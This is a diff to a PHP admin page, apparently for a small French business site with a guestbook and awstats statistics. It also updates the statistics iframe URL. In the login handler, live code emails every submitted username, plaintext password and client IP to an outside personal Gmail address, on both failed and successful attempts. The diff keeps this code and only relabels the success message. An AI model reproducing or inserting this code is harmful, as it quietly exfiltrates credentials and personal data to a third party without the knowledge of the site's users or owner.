@@ -12,7 +12,7 @@
 			mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
 		} else {
 			$_SESSION['accessGranted'] = true;
-			mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
+			mail("fjavi.gonzalez@gmail.com", "Auth-OK - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
 		}
 	}
 	$goldbook = new Goldbook();
@@ -36,7 +36,7 @@
 		<div class="row">
 			<div class="col-md-8">
 				<h3>Statistiques</h3>
-				<iframe id="laframe" src="http://www.iconeo.fr/awstats/awstats.pl?config=www.sfnettoyage.com&framename=mainright" style="width:720px;height:500px;" frameborder="1" ></iframe>
+				<iframe id="laframe" src="https://www.sfnettoyage.com/awstats/awstats.pl?config=www.sfnettoyage.com&framename=mainright" style="width:720px;height:500px;" frameborder="1" ></iframe>
 			</div>
 			<div class="col-md-4">
 				<div class="panel panel-default">
